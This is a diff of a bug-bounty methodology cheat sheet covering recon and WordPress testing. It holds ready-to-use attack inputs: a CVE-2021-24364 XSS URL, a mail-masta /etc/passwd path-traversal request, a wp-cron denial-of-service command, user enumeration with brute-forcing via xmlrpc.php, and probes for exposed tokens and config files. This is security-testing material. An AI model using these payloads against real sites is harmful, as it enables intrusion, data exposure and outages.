@@ -12,7 +12,7 @@ Prerequesics:
 Subdomain Enumeration
 1- amass enum -active -d hackerone.com -src -dir h1_amass -o output_h1_active.txt -rf 50resolvers.txt -config /home/.config/amass/config.ini
 2- subdomain finder => subdomainfinder.c99.nl/
-3- 
+3- #curl -s "https://crt.sh/?q=${TARGET}&output=json" | jq -r '.[] | "\(.name_value)\n\(.common_name)"' | sort -u > "${TARGET}_crt.sh.txt"
 
 
 cat allsubdomains | httpx -title -fr 
@@ -50,7 +50,21 @@ Wordpress
 	
 9- url": "https://wpscan.com/vulnerability/bb20d732-a5e4-4140-ab51-b2aa1a53db12"	
 10- http://server/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
-11- 
+11-
+	1- 	xmlrpc.php 	=> https://github.com/nullfd/xmlrpc-scan 	==> scanner 
+	2- 	/wp-content/uploads		=> directory listing
+	3- 	CVE-2021-24364	==> xss via wordpress before 5.4.4
+site.com/wp-admin/admin-ajax.php?action=tie_get_user_weather&options=%7B%27location%27%3A%27Cairo%27%2C%27units%27%3A%27C%27%2C%27forecast_days%27%3A%275%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ecustom_name%27%3A%27Cairo%27%2C%27animated%27%3A%27true%27%7D
+
+4- Wp Cornjob Dos
+	    visit site.com/wp-cron.php
+	    You will see a Blank page with 200 HTTP status code
+	    exploit: python3 doser.py -t 999 "http://site.com/wp-corn.php"
+	-	((( doser => https://github.com/quitten/doser.py	))))
+		
+5- User Enumeration 
+	visit : site.com/wp-json/wp/v2/users/
+	can exploit user and brute force it in xmlrpc.php
 
 -----------------------------------------------------------------------------------------------------
 Automatic scanners 
@@ -183,6 +197,21 @@ Js Analaysis
 	after gathering tokens use  ( token-spray ) template 
 	nuclei -t nuclei-templates/token-spray -var token=goanmginaonim
 	or can use file of tokens in token=token_file
+---------------------------------------------------------------------------
+Information Disclosure 
+- /en-US/splunkd/__raw/services/server/info/server-info?output_mode=json >>https://hackerone.com/reports/1860905
+    2- http://example.com/.gitlab-ci.yml 
+    3- http://google.com/direcotry/direcotry/file=/proc/version ==> add dircrotyies fuzzing to see if any of them accept parameter file lfi and try to add more and more 
+    2- files access_token.json
+ 	jsapi_ticket.json
+      	docker-compose.yml
+	- /app_dev.php
+	- /app_dev.php/_profiler/phpinfo
+	- /app_dev.php/_profiler
+	- Look for "profiler token" in phpinfo()
+
+
+
 -----------------------------------------------------------------------------------------------------
 XXE
 to find xml can be found in contact_us page
@@ -955,24 +984,7 @@ tools:
 	- https://github.com/Raz0r/aemscan
 	-fuzzing wordlists => https://raw.githubusercontent.com/clarkvoss/AEM-List/main/paths
 	
-------------------------------------------------------------------------------------------------------
-Wordpress
 
-1- 	xmlrpc.php 	=> https://github.com/nullfd/xmlrpc-scan 	==> scanner 
-2- 	/wp-content/uploads		=> directory listing
-3- 	CVE-2021-24364	==> xss via wordpress before 5.4.4
-site.com/wp-admin/admin-ajax.php?action=tie_get_user_weather&options=%7B%27location%27%3A%27Cairo%27%2C%27units%27%3A%27C%27%2C%27forecast_days%27%3A%275%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ecustom_name%27%3A%27Cairo%27%2C%27animated%27%3A%27true%27%7D
-
-
-4- Wp Cornjob Dos
-	    visit site.com/wp-cron.php
-	    You will see a Blank page with 200 HTTP status code
-	    exploit: python3 doser.py -t 999 "http://site.com/wp-corn.php"
-	-	((( doser => https://github.com/quitten/doser.py	))))
-		
-5- User Enumeration 
-	visit : site.com/wp-json/wp/v2/users/
-	can exploit user and brute force it in xmlrpc.php
 
 -------------------------------------------------------------------------------------------------------
 Httpx 
